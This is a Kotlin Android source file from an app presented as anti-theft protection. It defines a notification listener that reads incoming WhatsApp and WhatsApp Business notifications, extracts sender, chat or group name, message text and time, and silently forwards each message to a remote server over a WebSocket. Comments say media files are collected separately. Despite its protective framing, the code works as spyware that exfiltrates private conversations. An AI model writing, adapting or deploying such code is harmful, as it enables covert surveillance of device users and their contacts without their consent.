package com.androidprotect

import android.app.Notification
import android.app.Person
import android.content.Context
import android.os.Build
import android.os.Bundle
import android.os.Parcelable
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import kotlinx.serialization.json.Json
import kotlinx.serialization.builtins.serializer

/**
 * Captures incoming WhatsApp (and WhatsApp Business) notifications and forwards
 * them to the server through the active WebSocket managed by AntiTheftService.
 *
 * Captures:
 * - Single message notifications
 * - Grouped message notifications (MessagingStyle) on Android N+
 * - Media captions/summaries when WhatsApp posts them as text
 *
 * Limitations:
 * - Only messages that generate a notification are captured.
 * - Sent messages are NOT captured here (WhatsApp does not post notifications for them).
 * - Actual media files (images/audio) are captured separately via WhatsAppMediaObserver.
 */
class WhatsAppNotificationListener : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        if (!WHATSAPP_PACKAGES.contains(sbn.packageName)) return

        val notification = sbn.notification ?: return
        val extras = notification.extras ?: return
        val baseTimestamp = sbn.postTime

        val messages = extractMessages(extras, baseTimestamp)
        if (messages.isEmpty()) return

        // Remember the most recent incoming chat address so media files can be associated
        messages.firstOrNull()?.address?.takeIf { it.isNotBlank() }?.let {
            lastAddress = it
        }

        for (msg in messages) {
            sendWhatsAppMessage(msg)
        }
    }

    private fun extractMessages(extras: Bundle, baseTimestamp: Long): List<WhatsMessage> {
        // 1) Try MessagingStyle bundle array (most reliable on Android N+)
        val fromMessagingStyle = extractFromMessagingStyle(extras, baseTimestamp)
        if (fromMessagingStyle.isNotEmpty()) return fromMessagingStyle

        // 2) Fallback to title/text parsing
        return extractFromTitleText(extras, baseTimestamp)
    }

    @Suppress("UNCHECKED_CAST")
    private fun extractFromMessagingStyle(extras: Bundle, baseTimestamp: Long): List<WhatsMessage> {
        val result = mutableListOf<WhatsMessage>()

        val conversationTitle = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString()?.trim() ?: ""
        val messagesBundle = extras.getParcelableArray(Notification.EXTRA_MESSAGES)
            ?: extras.getSerializable(Notification.EXTRA_MESSAGES) as? Array<Bundle>
            ?: return result

        for (bundle in messagesBundle.filterIsInstance<Bundle>()) {
            val text = bundle.getCharSequence("text")?.toString() ?: continue
            if (text.isBlank()) continue

            val timestamp = if (bundle.containsKey("timestamp")) {
                bundle.getLong("timestamp", baseTimestamp)
            } else baseTimestamp

            val senderPerson = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                bundle.getParcelable<Parcelable>("sender_person") as? Person
            } else null

            val sender = senderPerson?.name?.toString()?.trim()
                ?: bundle.getCharSequence("sender")?.toString()?.trim()
                ?: ""

            val isGroup = extras.getBoolean(Notification.EXTRA_IS_GROUP_CONVERSATION, false) ||
                    conversationTitle.isNotBlank()

            // For 1-on-1 chats the conversationTitle is usually empty and sender is the contact name.
            // For groups: conversationTitle = group name, sender = person name.
            val chatName = conversationTitle.ifBlank { sender }
            if (chatName.isBlank()) continue

            val body = if (isGroup && sender.isNotBlank() && conversationTitle.isNotBlank() && !text.startsWith(sender)) {
                "$sender: $text"
            } else text

            result.add(WhatsMessage(
                address = chatName,
                name = chatName,
                content = body,
                timestamp = timestamp
            ))
        }

        return result
    }

    private fun extractFromTitleText(extras: Bundle, baseTimestamp: Long): List<WhatsMessage> {
        val result = mutableListOf<WhatsMessage>()

        val rawTitle = extras.getString(Notification.EXTRA_TITLE)?.trim() ?: ""
        val rawText = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim()
            ?: extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim()
            ?: return result

        if (rawText.isBlank()) return result

        // Skip useless generic summaries (e.g. "WhatsApp", "Nova mensagem", "X mensagens")
        val title = cleanTitle(rawTitle)

        // "(15 mensagens): João: oi" -> handle summary prefix
        val text = cleanSummaryPrefix(rawText)

        // Group chats often format content as "Sender Name: message text"
        val (sender, body) = parseGroupSender(text)
        val chatName = title.ifBlank { sender }
        if (chatName.isBlank() || isGenericName(chatName)) return result

        result.add(WhatsMessage(
            address = chatName,
            name = chatName,
            content = body,
            timestamp = baseTimestamp
        ))
        return result
    }

    private fun cleanTitle(title: String): String {
        if (title.isBlank()) return ""
        val lower = title.lowercase()
        if (lower == "whatsapp" || lower == "nova mensagem" || lower == "mensagem") return ""
        // Remove trailing summary like " (15 mensagens)" from title
        return title.replace(Regex("\\s*\\(\\d+\\s+mensagens?\\).*$", RegexOption.IGNORE_CASE), "").trim()
    }

    private fun cleanSummaryPrefix(text: String): String {
        return text.replace(Regex("^\\(\\d+\\s+mensagens?\\):\\s*", RegexOption.IGNORE_CASE), "").trim()
    }

    private fun parseGroupSender(text: String): Pair<String, String> {
        val idx = text.indexOf(": ")
        return if (idx in 1..39) {
            text.substring(0, idx) to text.substring(idx + 2)
        } else {
            "" to text
        }
    }

    private fun isGenericName(name: String): Boolean {
        val lower = name.lowercase()
        return lower == "whatsapp" || lower == "nova mensagem" || lower == "mensagem" ||
                lower == "conversas" || lower == "chats" || lower == "status" ||
                lower == "ligações" || lower == "calls"
    }

    private fun sendWhatsAppMessage(msg: WhatsMessage) {
        try {
            val address = Json.encodeToString(String.serializer(), msg.address)
            val name = Json.encodeToString(String.serializer(), msg.name)
            val content = Json.encodeToString(String.serializer(), msg.content)
            val payload = """{"type":"WHATSAPP_MESSAGE","direction":"in","address":$address,"name":$name,"content":$content,"timestamp":${msg.timestamp}}"""
            val sent = AntiTheftService.sendRawMessage(payload)
            Log.d("WhatsAppListener", "forwarded message to ${msg.address}: $sent")
        } catch (e: Exception) {
            Log.e("WhatsAppListener", "Failed to forward message: ${e.message}")
        }
    }

    private data class WhatsMessage(
        val address: String,
        val name: String,
        val content: String,
        val timestamp: Long
    )

    companion object {
        private val WHATSAPP_PACKAGES = setOf("com.whatsapp", "com.whatsapp.w4b")
        @Volatile private var lastAddress: String = ""

        fun lastIncomingAddress(): String = lastAddress

        fun isEnabled(context: Context): Boolean {
            val flat = android.provider.Settings.Secure.getString(
                context.contentResolver,
                "enabled_notification_listeners"
            ) ?: return false
            return flat.contains("${context.packageName}/${WhatsAppNotificationListener::class.java.name}")
        }
    }
}
